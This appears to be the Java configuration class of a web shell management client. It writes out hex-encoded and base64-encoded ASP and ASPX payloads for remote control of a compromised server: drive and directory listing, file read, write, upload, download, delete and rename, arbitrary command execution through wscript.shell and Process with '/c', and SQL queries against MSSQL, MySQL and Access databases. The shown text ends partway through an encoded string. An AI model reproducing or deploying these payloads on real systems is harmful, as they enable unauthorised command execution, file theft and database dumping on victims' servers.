package com.ms509.util;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;

public class InitConfig {

	public InitConfig() {
		// TODO Auto-generated constructor stub
		Init();
	}

	private void Init() {
		File conf = new File("Config.ini");
		if (conf.exists()) {	
	//		WriteParams();		//调试的时候取消注释，即无论怎么都要重新写一遍配置文件，发布的时候不要忘记注释掉。
			LoadParams();
		} else {
			WriteParams();
			LoadParams();

		}
	}

	private void WriteParams() {
		Configuration config = new Configuration();
		config.setValue("SPL", "->|");
		config.setValue("SPR", "|<-");
		config.setValue("CODE", "code");
		config.setValue("ACTION", "action");
		config.setValue("PARAM1", "z1");
		config.setValue("PARAM2", "z2");
		
		
		
		
		config.setValue("ASP_BASE64", "0");
		config.setValue("ASP_MAKE", "Execute(\"Execute(\"\"On+Error+Resume+Next:Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\"):Execute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"PAYLOAD\"\"\"\")):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")");
		config.setValue("ASP_INDEX", "44696D20533A533D5365727665722E4D61707061746828222E2229266368722839293A53455420433D4372656174654F626A6563742822536372697074696E672E46696C6553797374656D4F626A65637422293A496620457272205468656E3A4572722E436C6561723A456C73653A466F722045616368204420696E20432E4472697665733A533D5326442E44726976654C657474657226636872283538293A4E6578743A456E642049663A526573706F6E73652E5772697465285329");
		//config.setValue(key, value);
		config.setValue("ASP_READDICT", "44696D2052523A52523D6264285265717565737428227A312229293A46756E6374696F6E204644286474293A46443D596561722864742926222D223A4966204C656E284D6F6E746828647429293D31205468656E3A4644203D204644262230223A456E642049663A46443D4644264D6F6E74682864742926222D223A4966204C656E2844617928647429293D31205468656E3A46443D4644262230223A456E642049663A46443D464426446179286474292622202226466F726D61744461746554696D652864742C342926223A223A4966204C656E285365636F6E6428647429293D31205468656E3A46443D4644262230223A456E642049663A46443D4644265365636F6E64286474293A456E642046756E6374696F6E3A53455420433D4372656174654F626A6563742822536372697074696E672E46696C6553797374656D4F626A65637422293A53657420464F3D432E476574466F6C646572282222265252262222293A496620457272205468656E3A526573706F6E73652E577269746528224552524F523A2F2F2022264572722E4465736372697074696F6E293A4572722E436C6561723A456C73653A466F722045616368204620696E20464F2E737562666F6C646572733A526573706F6E73652E577269746520462E4E616D6526636872283437292663687228392926464428462E446174654C6173744D6F646966696564292663687228392926636872283438292663687228392926432E476574466F6C64657228462E50617468292E6174747269627574657326636872283130293A4E6578743A466F722045616368204C20696E20464F2E66696C65733A526573706F6E73652E5772697465204C2E4E616D6526636872283929264644284C2E446174654C6173744D6F6469666965642926636872283929264C2E73697A652663687228392926432E47657446696C65284C2E50617468292E6174747269627574657326636872283130293A4E6578743A456E64204966");
		config.setValue("ASP_READFILE", "526573706F6E73652E5772697465284372656174654F626A6563742822536372697074696E672E46696C6553797374656D4F626A65637422292E4F70656E5465787466696C65286264285265717565737428227A312229292C312C46616C7365292E72656164616C6C293A496620457272205468656E3A526573706F6E73652E577269746528224552524F523A2F2F2022264572722E4465736372697074696F6E293A4572722E436C6561723A456E64204966");
		config.setValue("ASP_SAVEFILE", "4372656174654F626A6563742822536372697074696E672E46696C6553797374656D4F626A65637422292E4372656174655465787446696C65282222266264285265717565737428227A31222929262222292E5772697465282222265265717565737428227A322229262222293A496620457272205468656E3A533D224552524F523A2F2F2022264572722E4465736372697074696F6E3A456C73653A533D2231223A526573706F6E73652E57726974652853293A456E64204966");
		config.setValue("ASP_SHELL", "Set X=CreateObject(\"wscript.shell\").exec(\"\"\"\"&bd(Request(\"PARAM1\"))&\"\"\" /c \"\"\"&bd(Request(\"PARAM2\"))&\"\"\"\"):If Err Then:S=\"[Err] \"&Err.Description:Err.Clear:Else:O=X.StdOut.ReadAll():E=X.StdErr.ReadAll():S=O&E:End If:Response.write(S)");
		config.setValue("ASP_NEWDICT", "5365742046733D4372656174654F626A6563742822536372697074696E672E46696C6553797374656D4F626A65637422293A46732E437265617465466F6C646572285265717565737428227A312229293A5365742046733D4E6F7468696E673A496620457272205468656E3A533D224552524F523A2F2F2022264572722E4465736372697074696F6E3A456C73653A533D2231223A456E642049663A526573706F6E73652E5772697465285329");
		config.setValue("ASP_DELETE", "44696D20503A503D5265717565737428227A3122293A5365742046533D4372656174654F626A6563742822536372697074696E672E46696C6553797374656D4F626A65637422293A49662046532E466F6C6465724578697374732850293D74727565205468656E3A46532E44656C657465466F6C6465722850293A456C73653A46532E44656C65746546696C652850293A456E642049663A5365742046533D4E6F7468696E673A496620457272205468656E3A533D224552524F523A2F2F2022264572722E4465736372697074696F6E3A456C73653A533D2231223A526573706F6E73652E57726974652853293A456E64204966");
		config.setValue("ASP_UPLOAD", "44696D206C2C73732C66662C543A66663D6264287265717565737428227A312229293A73733D5265717565737428227A3222293A6C3D4C656E287373293A53657420533D5365727665722E4372656174654F626A656374282241646F64622E53747265616D22293A5769746820533A2E547970653D313A2E4D6F64653D333A2E4F70656E3A4966205265717565737428227A3322293E30205468656E3A2E4C6F616446726F6D46696C652022222666662622223A2E506F736974696F6E3D2E53697A653A456E642049663A7365742072733D4372656174654F626A656374282241444F44422E5265636F726473657422293A72732E6669656C64732E617070656E6420226262222C3230352C6C2F323A72732E6F70656E3A72732E6164646E65773A72732822626222293D73732B636872622830293A72732E7570646174653A2E57726974652072732822626222292E6765746368756E6B286C2F32293A72732E636C6F73653A5365742072733D4E6F7468696E673A2E506F736974696F6E3D303A2E53617665546F46696C652022222666662622222C323A2E436C6F73653A456E6420576974683A53657420533D4E6F7468696E673A496620457272205468656E3A543D4572722E4465736372697074696F6E3A4572722E436C6561723A456C73653A543D2231223A456E642049663A526573706F6E73652E5772697465285429");
		config.setValue("ASP_DOWNLOAD", "44696D20692C632C723A53657420533D5365727665722E4372656174654F626A656374282241646F64622E53747265616D22293A4966204E6F7420457272205468656E3A5769746820533A2E4D6F64653D333A2E547970653D313A2E4F70656E3A2E4C6F616446726F6D46696C65285265717565737428227A312229293A693D303A633D2E53697A653A723D313032343A5768696C6520693C633A526573706F6E73652E42696E6172795772697465202E526561642872293A526573706F6E73652E466C7573683A693D692B723A57656E643A2E436C6F73653A53657420533D4E6F7468696E673A456E6420576974683A456C73653A526573706F6E73652E42696E617279577269746520224552524F523A2F2F2022264572722E4465736372697074696F6E3A456E64204966");
		config.setValue("ASP_RENAME", "53463D5265717565737428227A3122293A44463D5265717565737428227A3222293A5365742046733D4372656174654F626A6563742822536372697074696E672E46696C6553797374656D4F626A65637422293A49662046732E466F6C64657245786973747328534629205468656E3A46732E4D6F7665466F6C6465722053462C44463A456C73653A46732E4D6F766546696C652053462C44463A456E642049663A5365742046733D4E6F7468696E673A496620457272205468656E3A53493D224552524F523A2F2F2022264572722E4465736372697074696F6E3A456C73653A53493D2231223A456E642049663A526573706F6E73652E577269746528534929");
		config.setValue("ASP_DB_MDB", "Execute(\"Execute(\"\"On+Error+Resume+Next:Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\"):Execute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"53657420436f6e6e3d5365727665722e4372656174654f626a656374282241646f64622e636f6e6e656374696f6e22293a436f6e6e2e4f70656e202222266264285265717565737428227a312229292622223a44696d20434f2c48442c524e3a434f3d636872283929266368722831323429266368722839293a524e3d6368722831332926636872283130293a48443d22526573756c742226434f26524e3a4966205265717565737428227a3222293c3e2222205468656e3a496620457272205468656e3a526573706f6e73652e5772697465204844264572722e4465736372697074696f6e26434f26524e3a4572722e436c6561723a456c73653a5365742052733d436f6e6e2e45786563757465282222266264285265717565737428227a32222929262222293a496620457272205468656e3a526573706f6e73652e5772697465204844264572722e4e756d62657226223a22264572722e4465736372697074696f6e26434f26524e3a4572722e436c6561723a456c73653a44696d20464e3a464e3d52732e4669656c64732e436f756e742d313a466f72206e3d3020546f20464e3a526573706f6e73652e57726974652052732e4669656c64732e4974656d286e292e4e616d6526434f3a4e6578743a526573706f6e73652e577269746520524e3a446f205768696c65204e6f742852732e456f66204f722052732e426f66293a466f72206e3d3020546f20464e3a526573706f6e73652e5772697465205273286e293a526573706f6e73652e577269746520434f3a4e6578743a526573706f6e73652e577269746520524e3a52732e4d6f76654e6578743a4c6f6f703a456e642049663a5365742052733d4e6f7468696e673a436f6e6e2e436c6f73653a456e642049663a53657420436f6e6e3d4e6f7468696e673a456e642049663a4966205265717565737428227a3222293d2222205468656e3a496620457272205468656e3a53493d224552524f523a2f2f2022264572722e4465736372697074696f6e3a4572722e436c6561723a456c73653a5365742052733d436f6e6e2e4f70656e536368656d61283230293a52732e4d6f766546697273743a53493d22223a446f205768696c65204e6f742052732e456f663a496620527328225441424c455f5459504522293d225441424c4522205468656e3a53493d534926527328225441424c455f4e414d45222926434f26524e3a456e642049663a52732e4d6f76654e6578743a4c6f6f703a5365742052733d4e6f7468696e673a436f6e6e2e436c6f73653a456e642049663a53657420436f6e6e3d4e6f7468696e673a526573706f6e73652e5772697465285349293a456e642049663a\"\"\"\")):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")");
		config.setValue("ASP_DB_MSSQL", "Execute(\"Execute(\"\"On+Error+Resume+Next:Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\"):Execute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"53657420436f6e6e3d5365727665722e4372656174654f626a656374282241646f64622e636f6e6e656374696f6e22293a436f6e6e2e4f70656e202222266264285265717565737428227a312229292622223a44696d2053492c434f2c48442c524e3a434f3d636872283929266368722831323429266368722839293a524e3d6368722831332926636872283130293a48443d22526573756c742226434f26524e3a4966205265717565737428227a3222293c3e2222205468656e3a496620457272205468656e3a526573706f6e73652e5772697465204844264572722e4465736372697074696f6e26434f26524e3a4572722e436c6561723a456c73653a5365742052733d436f6e6e2e45786563757465282222266264285265717565737428227a32222929262222293a496620457272205468656e3a526573706f6e73652e5772697465204844264572722e4e756d62657226223a22264572722e4465736372697074696f6e26434f26524e3a4572722e436c6561723a456c73653a44696d20464e3a464e3d52732e4669656c64732e436f756e742d313a466f72206e3d3020546f20464e3a526573706f6e73652e57726974652052732e4669656c64732e4974656d286e292e4e616d6526434f3a4e6578743a526573706f6e73652e577269746520524e3a446f205768696c65204e6f742852732e456f66204f722052732e426f66293a466f72206e3d3020546f20464e3a526573706f6e73652e5772697465205273286e293a526573706f6e73652e577269746520434f3a4e6578743a526573706f6e73652e577269746520524e3a52732e4d6f76654e6578743a4c6f6f703a456e642049663a5365742052733d4e6f7468696e673a436f6e6e2e436c6f73653a456e642049663a53657420436f6e6e3d4e6f7468696e673a456e642049663a4966205265717565737428227a3222293d2222205468656e3a496620457272205468656e3a53493d224552524f523a2f2f2022264572722e4465736372697074696f6e3a4572722e436c6561723a456c73653a5365742052733d436f6e6e2e4f70656e536368656d61283230293a52732e4d6f766546697273743a53493d22223a446f205768696c65204e6f742052732e456f663a496620527328225441424c455f5459504522293d225441424c4522205468656e3a53493d534926527328225441424c455f4e414d45222926434f26524e3a456e642049663a52732e4d6f76654e6578743a4c6f6f703a5365742052733d4e6f7468696e673a436f6e6e2e436c6f73653a456e642049663a53657420436f6e6e3d4e6f7468696e673a526573706f6e73652e5772697465285349293a456e642049663a\"\"\"\")):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")");
		config.setValue("ASP_DB_MYSQL", "Execute(\"Execute(\"\"On+Error+Resume+Next:Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\"):Execute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"53657420436f6e6e3d5365727665722e4372656174654f626a656374282241646f64622e636f6e6e656374696f6e22293a436f6e6e2e4f70656e202222266264285265717565737428227a312229292622223a44696d2053492c434f2c48442c524e3a434f3d636872283929266368722831323429266368722839293a524e3d6368722831332926636872283130293a48443d22526573756c742226434f26524e3a4966205265717565737428227a3222293c3e2222205468656e3a496620457272205468656e3a526573706f6e73652e5772697465204844264572722e4465736372697074696f6e26434f26524e3a4572722e436c6561723a456c73653a5365742052733d436f6e6e2e45786563757465282222266264285265717565737428227a32222929262222293a496620457272205468656e3a526573706f6e73652e5772697465204844264572722e4e756d62657226223a22264572722e4465736372697074696f6e26434f26524e3a4572722e436c6561723a456c73653a44696d20464e3a464e3d52732e4669656c64732e436f756e742d313a466f72206e3d3020546f20464e3a526573706f6e73652e57726974652052732e4669656c64732e4974656d286e292e4e616d6526434f3a4e6578743a526573706f6e73652e577269746520524e3a446f205768696c65204e6f742852732e456f66204f722052732e426f66293a466f72206e3d3020546f20464e3a526573706f6e73652e5772697465205273286e293a526573706f6e73652e577269746520434f3a4e6578743a526573706f6e73652e577269746520524e3a52732e4d6f76654e6578743a4c6f6f703a456e642049663a5365742052733d4e6f7468696e673a436f6e6e2e436c6f73653a456e642049663a53657420436f6e6e3d4e6f7468696e673a456e642049663a4966205265717565737428227a3222293d2222205468656e3a496620457272205468656e3a53493d224552524f523a2f2f2022264572722e4465736372697074696f6e3a4572722e436c6561723a456c73653a5365742052733d436f6e6e2e4f70656e536368656d61283230293a52732e4d6f766546697273743a53493d22223a446f205768696c65204e6f742052732e456f663a496620527328225441424c455f5459504522293d225441424c4522205468656e3a53493d534926527328225441424c455f4e414d45222926434f26524e3a456e642049663a52732e4d6f76654e6578743a4c6f6f703a5365742052733d4e6f7468696e673a436f6e6e2e436c6f73653a456e642049663a53657420436f6e6e3d4e6f7468696e673a526573706f6e73652e5772697465285349293a456e642049663a\"\"\"\")):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")");
		
		
		config.setValue("ASPX_MAKE", "Response.Write(\"->|\");var Err:Exception;var k=\"PAYLOAD\";try{eval(k,\"unsafe\");}catch(err){Response.Write(err);};Response.Write(\"|<-\");");
		config.setValue("ASPX_INDEX", "var c=System.IO.Directory.GetLogicalDrives();Response.Write(Server.MapPath(\\\".\\\")+\\\"	\\\");for(var i=0;i<=c.length-1;i++)Response.Write(c[i][0]+\\\":\\\");");
		//config.setValue("ASPX_READDICT", "var D=Request.Item[\"z1\"];var m=new System.IO.DirectoryInfo(D);var s=m.GetDirectories();var P:String;var i;function T(p:String):String{return System.IO.File.GetLastWriteTime(p).ToString(\"yyyy-MM-dd HH:mm:ss\");}for(i in s){P=D+s[i].Name;Response.Write(s[i].Name+\"/\\t\"+T(P)+\"\\t0\\t-\\n\");}s=m.GetFiles();for(i in s){P=D+s[i].Name;Response.Write(s[i].Name+\"\\t\"+T(P)+\"\\t\"+s[i].Length+\"\\t-\\n\");}");
		config.setValue("ASPX_READDICT", "Response.Write(\"->|\");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(\"dmFyIEQ9U3lzdGVtLlRleHQuRW5jb2RpbmcuR2V0RW5jb2RpbmcoOTM2KS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1bInoxIl0pKTt2YXIgbT1uZXcgU3lzdGVtLklPLkRpcmVjdG9yeUluZm8oRCk7dmFyIHM9bS5HZXREaXJlY3RvcmllcygpO3ZhciBQOlN0cmluZzt2YXIgaTtmdW5jdGlvbiBUKHA6U3RyaW5nKTpTdHJpbmd7cmV0dXJuIFN5c3RlbS5JTy5GaWxlLkdldExhc3RXcml0ZVRpbWUocCkuVG9TdHJpbmcoInl5eXktTU0tZGQgSEg6bW06c3MiKTt9Zm9yKGkgaW4gcyl7UD1EK3NbaV0uTmFtZTtSZXNwb25zZS5Xcml0ZShzW2ldLk5hbWUrIi9cdCIrVChQKSsiXHQwXHQtXG4iKTt9cz1tLkdldEZpbGVzKCk7Zm9yKGkgaW4gcyl7UD1EK3NbaV0uTmFtZTtSZXNwb25zZS5Xcml0ZShzW2ldLk5hbWUrIlx0IitUKFApKyJcdCIrc1tpXS5MZW5ndGgrIlx0LVxuIik7fQ%3D%3D\")),\"unsafe\");}catch(err){Response.Write(\"ERROR:// \"%2Berr.message);}Response.Write(\"|<-\");Response.End()");
		config.setValue("ASPX_READFILE", "Response.Write(\"->|\");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(\"dmFyIFA9U3lzdGVtLlRleHQuRW5jb2RpbmcuR2V0RW5jb2RpbmcoOTM2KS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1bInoxIl0pKTt2YXIgbT1uZXcgU3lzdGVtLklPLlN0cmVhbVJlYWRlcihQLEVuY29kaW5nLkRlZmF1bHQpO1Jlc3BvbnNlLldyaXRlKG0uUmVhZFRvRW5kKCkpO20uQ2xvc2UoKTs%3D\")),\"unsafe\");}catch(err){Response.Write(\"ERROR:// \"%2Berr.message);}Response.Write(\"|<-\");Response.End();");
		config.setValue("ASPX_SAVEFILE", "Response.Write(\"->|\");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(\"dmFyIFoyOlN0cmluZz1SZXF1ZXN0Lkl0ZW1bInoyIl07dmFyIEI6Ynl0ZVtdPW5ldyBieXRlW1oyLkxlbmd0aC8yXTtmb3IodmFyIGk6aW50PTA7aTxaMi5MZW5ndGg7aSs9Mil7QltpLzJdPWJ5dGUoQ29udmVydC5Ub0ludDMyKFoyLlN1YnN0cmluZyhpLDIpLDE2KSk7fXZhciBQPVN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDkzNikuR2V0U3RyaW5nKFN5c3RlbS5Db252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoUmVxdWVzdC5JdGVtWyJ6MSJdKSk7dmFyIG09bmV3IFN5c3RlbS5JTy5TdHJlYW1Xcml0ZXIoUCxmYWxzZSxFbmNvZGluZy5EZWZhdWx0KTttLldyaXRlKFN5c3RlbS5UZXh0LkVuY29kaW5nLkRlZmF1bHQuR2V0U3RyaW5nKEIpKTttLkNsb3NlKCk7UmVzcG9uc2UuV3JpdGUoIjEiKTs%3D\")),\"unsafe\");}catch(err){Response.Write(\"ERROR:// \"%2Berr.message);}Response.Write(\"|<-\");Response.End();");
		config.setValue("ASPX_NEWDICT", "Response.Write(\"->|\");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(\"dmFyIEQ9UmVxdWVzdC5JdGVtWyJ6MSJdO1N5c3RlbS5JTy5EaXJlY3RvcnkuQ3JlYXRlRGlyZWN0b3J5KEQpO1Jlc3BvbnNlLldyaXRlKCIxIik7\")),\"unsafe\");}catch(err){Response.Write(\"ERROR:// \"%2Berr.message);}Response.Write(\"|<-\");Response.End();");
		config.setValue("ASPX_DELETE", "Response.Write(\"->|\");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(\"dmFyIFA6U3RyaW5nPVJlcXVlc3QuSXRlbVsiejEiXTtpZihTeXN0ZW0uSU8uRGlyZWN0b3J5LkV4aXN0cyhQKSl7U3lzdGVtLklPLkRpcmVjdG9yeS5EZWxldGUoUCx0cnVlKTt9ZWxzZXtTeXN0ZW0uSU8uRmlsZS5EZWxldGUoUCk7fVJlc3BvbnNlLldyaXRlKCIxIik7\")),\"unsafe\");}catch(err){Response.Write(\"ERROR:// \"%2Berr.message);}Response.Write(\"|<-\");Response.End();");
		config.setValue("ASPX_RENAME", "Response.Write(\"->|\");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(\"dmFyIHNyYz1SZXF1ZXN0Lkl0ZW1bInoxIl0sZHN0PVJlcXVlc3QuSXRlbVsiejIiXTtpZiAoU3lzdGVtLklPLkRpcmVjdG9yeS5FeGlzdHMoc3JjKSl7U3lzdGVtLklPLkRpcmVjdG9yeS5Nb3ZlKHNyYyxkc3QpO31lbHNle1N5c3RlbS5JTy5GaWxlLk1vdmUoc3JjLGRzdCk7fVJlc3BvbnNlLldyaXRlKCIxIik7\")),\"unsafe\");}catch(err){Response.Write(\"ERROR:// \"%2Berr.message);}Response.Write(\"|<-\");Response.End();");
		config.setValue("ASPX_SHELL", "var c=new System.Diagnostics.ProcessStartInfo(Request.Item[\\\"z1\\\"]);var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments=\\\"/c \\\"%2bRequest.Item[\\\"z2\\\"];e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd()%2bEI.ReadToEnd());");
		config.setValue("ASPX_UPLOAD", "Response.Write(\"->|\");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(\"dmFyIFA6U3RyaW5nPVN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDY1MDAxKS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1bInoxIl0pKTt2YXIgWjpTdHJpbmc9UmVxdWVzdC5JdGVtWyJ6MiJdO3ZhciBLOlN0cmluZz1SZXF1ZXN0Lkl0ZW1bInozIl07dmFyIEI6Ynl0ZVtdPW5ldyBieXRlW1ouTGVuZ3RoLzJdO2Zvcih2YXIgaT0wO2k8Wi5MZW5ndGg7aSs9Mil7QltpLzJdPWJ5dGUoQ29udmVydC5Ub0ludDMyKFouU3Vic3RyaW5nKGksMiksMTYpKTt9dmFyIGZzOlN5c3RlbS5JTy5GaWxlU3RyZWFtO2lmKEs9PSIxIil7ZnM9bmV3IFN5c3RlbS5JTy5GaWxlU3RyZWFtKFAsU3lzdGVtLklPLkZpbGVNb2RlLkNyZWF0ZSk7fWVsc2V7ZnM9bmV3IFN5c3RlbS5JTy5GaWxlU3RyZWFtKFAsU3lzdGVtLklPLkZpbGVNb2RlLkFwcGVuZCk7fWZzLldyaXRlKEIsMCxCLkxlbmd0aCk7ZnMuQ2xvc2UoKTtSZXNwb25zZS5Xcml0ZSgiMSIpOw%3D%3D\")),\"unsafe\");}catch(err){Response.Write(\"ERROR:// \"%2Berr.message);}Response.Write(\"|<-\");Response.End();");
		config.setValue("ASPX_DOWNLOAD", "Response.Write(\"->|\");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(\"UmVzcG9uc2UuV3JpdGVGaWxlKFJlcXVlc3QuSXRlbVsiejEiXSk7\")),\"unsafe\");}catch(err){Response.Write(\"ERROR:// \"%2Berr.message);}Response.Write(\"|<-\");Response.End();");
		config.setValue("ASPX_DB_MSSQL", "Response.Write(\"->|\");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(\"dmFyIENvbm49bmV3IEFjdGl2ZVhPYmplY3QoIkFkb2RiLmNvbm5lY3Rpb24iKTt2YXIgc3RyU1FMOlN0cmluZz1TeXN0ZW0uVGV4dC5FbmNvZGluZy5HZXRFbmNvZGluZyg2NTAwMSkuR2V0U3RyaW5nKFN5c3RlbS5Db252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoUmVxdWVzdC5JdGVtWyJ6MiJdKSk7Q29ubi5Db25uZWN0aW9uU3RyaW5nPVN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDY1MDAxKS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1bInoxIl0pKTtDb25uLkNvbm5lY3Rpb25UaW1lb3V0PTEwO0Nvbm4uT3BlbigpO2lmKHN0clNRTD09IiIpe3ZhciBScz1Db25uLk9wZW5TY2hlbWEoMjApO3ZhciB4OlN0cmluZz0iIjt3aGlsZSghUnMuRU9GICYmICFScy5CT0Ype2lmKFJzLkZpZWxkcygzKS5WYWx1ZT09IlRBQkxFIil7eCs9UnMuRmllbGRzKDIpLlZhbHVlKyJcdHxcdFxyXG4iO31Scy5Nb3ZlTmV4dCgpO31Scy5DbG9zZSgpO0Nvbm4uQ2xvc2UoKTtSZXNwb25zZS5Xcml0ZSh4KTt9ZWxzZXt2YXIgQ086U3RyaW5nPSJcdHxcdCIsUk46U3RyaW5nPSJcclxuIixEYXQ6U3RyaW5nO3ZhciBScz1Db25uLkV4ZWN1dGUoc3RyU1FMKTt2YXIgaTpJbnQzMj1Scy5GaWVsZHMuQ291bnQsYzpJbnQzMjtmb3IoYz0wO2M8aTtjKyspe1Jlc3BvbnNlLldyaXRlKFJzLkZpZWxkcyhjKS5OYW1lK0NPKTt9UmVzcG9uc2UuV3JpdGUoUk4pO3doaWxlKCFScy5FT0YgJiYgIVJzLkJPRil7Zm9yKGM9MDtjPGk7YysrKXtEYXQ9UnMuRmllbGRzKGMpLlZhbHVlO1Jlc3BvbnNlLldyaXRlKERhdCk7UmVzcG9uc2UuV3JpdGUoQ08pO31SZXNwb25zZS5Xcml0ZShSTik7UnMuTW92ZU5leHQoKTt9Q29ubi5DbG9zZSgpO30%3D\")),\"unsafe\");}catch(err){Response.Write(\"ERROR:// \"%2Berr.message);}Response.Write(\"|<-\");Response.End();");
		config.setValue("ASPX_DB_MDB","Response.Write(\"->|\");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(\"dmFyIENvbm49bmV3IEFjdGl2ZVhPYmplY3QoIkFkb2RiLmNvbm5lY3Rpb24iKTt2YXIgc3RyU1FMOlN0cmluZz1TeXN0ZW0uVGV4dC5FbmNvZGluZy5HZXRFbmNvZGluZyg2NTAwMSkuR2V0U3RyaW5nKFN5c3RlbS5Db252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoUmVxdWVzdC5JdGVtWyJ6MiJdKSk7Q29ubi5Db25uZWN0aW9uU3RyaW5nPVN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDY1MDAxKS5HZXRTdHJpbmcoU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhSZXF1ZXN0Lkl0ZW1bInoxIl0pKTtDb25uLkNvbm5lY3Rpb25UaW1lb3V0PTEwO0Nvbm4uT3BlbigpO2lmKHN0clNRTD09IiIpe3ZhciBScz1Db25uLk9wZW5TY2hlbWEoMjApO3ZhciB4OlN0cmluZz0iIjt3aGlsZSghUnMuRU9GICYmICFScy5CT0Ype2lmKFJzLkZpZWxkcygzKS5WYWx1ZT09IlRBQkxFIil7eCs9UnMuRmllbGRzKDIpLlZhbHVlKyJcdHxcdFxyXG4iO31Scy5Nb3ZlTmV4dCgpO31Scy5DbG9zZSgpO0Nvbm4uQ2xvc2UoKTtSZXNwb25zZS5Xcml0ZSh4KTt9ZWxzZXt0cnl7dmFyIENPOlN0cmluZz0iXHR8XHQiLFJOOlN0cmluZz0iXHJcbiIsRGF0OlN0cmluZzt2YXIgUnM9Q29ubi5FeGVjdXRlKHN0clNRTCk7dmFyIGk6SW50MzI9UnMuRmllbGRzLkNvdW50LGM6SW50MzI7Zm9yKGM9MDtjPGk7YysrKXtSZXNwb25zZS5Xcml0ZShScy5GaWVsZHMoYykuTmFtZStDTyk7fVJlc3Bv